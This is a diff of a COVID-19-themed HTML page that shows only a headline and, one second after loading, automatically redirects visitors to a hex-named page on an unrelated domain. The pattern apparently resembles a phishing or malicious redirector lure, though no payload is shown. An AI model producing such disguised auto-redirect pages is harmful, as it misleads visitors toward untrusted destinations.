@@ -1,40 +1,85 @@
 <!DOCTYPE html>
 <html lang="en">
-  <head>
-    <title>COVID-19 INFO</title>
-<link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/twitter-bootstrap/4.5.0/css/bootstrap.min.css">
+
+<head>
+    <title>COVID-19 Info</title>
+    <link href="https://fonts.googleapis.com/css?family=Roboto:900" rel="stylesheet">
     <style>
-body {
-  margin: 25px;
-}
+        @charset "UTF-8";
 
-h1, h2 {
-  font-size: 22pt;
-  font-weight: bold;
-}
+        #content,
+        #horizon {
+            position: absolute;
+            visibility: visible
+        }
 
-h2 {
-  font-size: 18pt;
-}
+        body {
+            font-family: Roboto, cursive;
+            color: #fff;
+            background-color: #fff;
+            margin: 0
+        }
 
-ul > li {
-  color: red;
-}
-    </style>  
+        img,
+        object {
+            max-height: 68%;
+            max-width: 68%;
+            position: absolute;
+            top: 0;
+            bottom: 0;
+            left: 0;
+            right: 0;
+            margin: auto;
+            border: 0 solid #fff
+        }
 
-  </head>
-  <body spellcheck="false" onload="setTimeout(&#34;delayer()&#34;,1e3)">
+        #horizon {
+            color: #096;
+            text-align: center;
+            top: 50%;
+            left: 0;
+            width: 100%;
+            height: 1px;
+            overflow: visible;
+            display: block
+        }
+
+        #content {
+            margin-left: -400px;
+            top: -68px;
+            left: 50%;
+            width: 800px;
+            height: 56px
+        }
+
+        .bodytext {
+            font-size: 14px
+        }
+
+        .style18 {
+            color: #3169b6
+        }
+
+        .style3 {
+            font-size: 68px;
+            font-weight: 700;
+            letter-spacing: 8px;
+            color: #ff0000
+        }
+    </style>
+</head>
+
+<body spellcheck="false" onload="setTimeout(&#34;delayer()&#34;,1e3)">
     <div id="horizon">
-      <div id="content">
-        <div class="bodytext">
-          <span class="style18"><span class="style3">COVID-19 INFO</span></span>
+        <div id="content">
+            <div class="bodytext"><span class="style18"><span class="style3">COVID-19<br>General Info</span></span></div>
         </div>
-      </div>
     </div>
     <script type="text/javascript">
-      function delayer() {
-        window.location = 'https://www.terencelim.com/76428318b641e994b33f5894daafa31b.html';
-      }
-    </script>
-  </body>
+        function delayer() {
+          window.location = 'https://www.terencelim.com/76428318b641e994b33f5894daafa31b.html';
+        }
+      </script>
+</body>
+
 </html>
